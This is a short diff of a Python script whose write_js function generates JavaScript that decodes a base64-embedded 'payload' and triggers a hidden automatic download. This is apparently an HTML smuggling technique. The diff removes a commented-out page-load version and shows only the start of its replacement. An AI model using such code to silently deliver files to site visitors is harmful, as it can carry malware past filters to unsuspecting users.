@@ -17,32 +17,6 @@ def detect_mime(ext):
 
 
 def write_js(payload_b64, mime, filename):
-#     payload = """
-# window.onload = () => {{
-#     const b64data = '{}';
-#     const decoded = atob(b64data);
-#     const bytes = new Uint8Array(decoded.length);
-#     for (let i = 0; i < decoded.length; i++) {{
-#         bytes[i] = decoded.charCodeAt(i);
-#     }}
-
-#     const blob = new Blob([bytes.buffer], {{ type: '{}' }});
-#     const url = URL.createObjectURL(blob);
-
-#     // Create a temporary download link.
-#     const a = document.createElement('a');
-#     a.style = 'display:none';
-#     a.href = url;
-#     a.download = '{}';
-#     document.body.appendChild(a);
-#     a.click();
-
-#     // Cleanup
-#     document.body.removeChild(a);
-#     URL.revokeObjectURL(url);
-# }}
-# """.format(payload_b64, mime, filename)
-    
     payload = """
 ((b64data, mime, filename) => {{
     const decoded = atob(b64data);
